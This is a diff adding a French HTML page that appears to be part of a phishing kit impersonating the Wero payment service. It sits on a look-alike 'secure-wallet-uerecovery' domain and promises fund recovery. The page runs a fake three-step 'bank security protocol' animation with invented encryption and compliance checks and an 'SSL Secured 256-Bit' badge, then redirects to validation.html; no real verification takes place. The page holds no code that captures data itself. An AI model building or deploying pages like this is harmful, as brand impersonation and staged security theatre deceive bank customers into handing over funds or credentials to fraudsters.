@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <meta name="theme-color" content="#efe685">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="default">
+    <title>Sécurisation | Wero</title>
+    <link rel="icon" type="image/png" href="flavicon.ico">
+    <link rel="apple-touch-icon" href="flavicon.ico">
+
+    <meta name="description" content="Récupérez vos fonds en toute sécurité grâce à Wero.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://secure-wallet-uerecovery.great-site.net/">
+    <meta property="og:title" content="Wero | Récupération de fonds sécurisée">
+    <meta property="og:description" content="Récupérez vos fonds en toute sécurité grâce à Wero. Solution rapide et fiable.">
+    <meta property="og:image" content="https://secure-wallet-uerecovery.great-site.net/assets/img/paw.jpg">
+
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content="https://secure-wallet-uerecovery.great-site.net/assets/img/paw.jpg">
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+   
+     <style>
+        :root {
+            --black: #111111;
+            --wero-yellow: #efe685; 
+            --bg-soft: #f8f9fa;
+            --border: 3px solid #111111;
+            --shadow: 10px 10px 0px #111111;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Poppins', sans-serif; /* Rendu graphique haut de gamme maintenant actif */
+            background: radial-gradient(circle at top right, var(--wero-yellow) 0%, #ffffff 45%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            overflow: hidden;
+            color: var(--black);
+        }
+
+        .premium-card {
+            background: white;
+            border: var(--border);
+            width: 90%;
+            max-width: 420px;
+            padding: 50px 40px;
+            text-align: center;
+            border-radius: 40px;
+            animation: fadeIn 0.4s cubic-bezier(0.16, 1, 0.3, 1);
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.96); }
+            to { opacity: 1; transform: scale(1); }
+        }
+
+        .icon-box {
+            width: 80px;
+            height: 80px;
+            background: var(--wero-yellow);
+            border: var(--border);
+            border-radius: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 30px;
+            transform: rotate(-3deg);
+        }
+
+        h1 { 
+            font-weight: 800; 
+            font-size: 24px; 
+            margin-bottom: 12px; 
+            letter-spacing: -0.5px;
+        }
+
+        .subtitle {
+            font-size: 14px;
+            color: #555;
+            margin-bottom: 30px;
+            font-weight: 600;
+        }
+
+        .progress-wrapper {
+            background: #f0f0f0;
+            height: 14px;
+            border: var(--border);
+            border-radius: 20px;
+            margin-bottom: 35px;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .progress-bar {
+            height: 100%;
+            background: var(--black);
+            width: 0%;
+            border-radius: 20px;
+            transition: width 0.1s linear; /* Animation de remplissage adoucie */
+        }
+
+        .steps-container {
+            text-align: left;
+        }
+
+        .step {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            font-weight: 700;
+            font-size: 13px;
+            margin-bottom: 12px;
+            padding: 10px 15px;
+            border-radius: 12px;
+            transition: all 0.2s ease;
+            opacity: 0.2;
+        }
+
+        .step.active { opacity: 1; background: #fafafa; }
+        .step.done { color: #27ae60; opacity: 1; }
+
+        .loader-spin { animation: spin 0.8s linear infinite; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .security-tag {
+            margin-top: 30px;
+            font-size: 10px;
+            font-weight: 800;
+            color: #bbb;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+        }
+    </style>
+</head>
+<body>
+    
+    <div class="premium-card">
+        <div class="icon-box">
+            <img src="flavicon.ico" alt="wero" style="width: 100px;">
+        </div>
+        
+        <h1>Vérification...</h1>
+        <p class="subtitle">Protocole de sécurité bancaire en cours</p>
+
+        <div class="progress-wrapper">
+            <div class="progress-bar" id="bar"></div>
+        </div>
+
+        <div class="steps-container">
+            <div class="step" id="s1">
+                <i class="fa-solid fa-circle-notch"></i> Cryptage des données
+            </div>
+            <div class="step" id="s2">
+                <i class="fa-solid fa-circle-notch"></i> Analyse de conformité
+            </div>
+            <div class="step" id="s3">
+                <i class="fa-solid fa-circle-notch"></i> Synchronisation finale
+            </div>
+        </div>
+
+        <div class="security-tag">
+            <i class="fa-solid fa-lock"></i> SSL Secured 256-Bit
+        </div>
+    </div>
+
+    <script>
+        const bar = document.getElementById('bar');
+        const steps = [document.getElementById('s1'), document.getElementById('s2'), document.getElementById('s3')];
+        let p = 0;
+
+        // Intervalle de 25ms pour charger de 0 à 100% en exactement 2,5 secondes
+        const interval = setInterval(() => {
+            p += 1;
+            bar.style.width = p + "%";
+
+            // Étape 1 : Cryptage des données
+            if(p === 5) { 
+                steps[0].classList.add('active'); 
+                steps[0].querySelector('i').classList.add('loader-spin'); 
+            }
+            
+            // Étape 2 : Analyse de conformité
+            if(p === 35) {
+                steps[0].classList.add('done');
+                steps[0].innerHTML = '<i class="fa-solid fa-circle-check"></i> Données cryptées';
+                steps[1].classList.add('active');
+                steps[1].querySelector('i').classList.add('loader-spin');
+            }
+
+            // Étape 3 : Synchronisation finale
+            if(p === 70) {
+                steps[1].classList.add('done');
+                steps[1].innerHTML = '<i class="fa-solid fa-circle-check"></i> Conformité validée';
+                steps[2].classList.add('active');
+                steps[2].querySelector('i').classList.add('loader-spin');
+            }
+
+            // Finalisation et redirection automatique
+            if (p >= 100) {
+                clearInterval(interval);
+                
+                // Pause de 500ms (0,5s) pour stabiliser visuellement la jauge pleine
+                // Total absolu de l'animation : 2500ms + 500ms = 3000ms (3 secondes pile)
+                setTimeout(() => { 
+                    window.location.href = "validation.html"; 
+                }, 500);
+            }
+        }, 25);
+    </script>
+</body>
+</html>
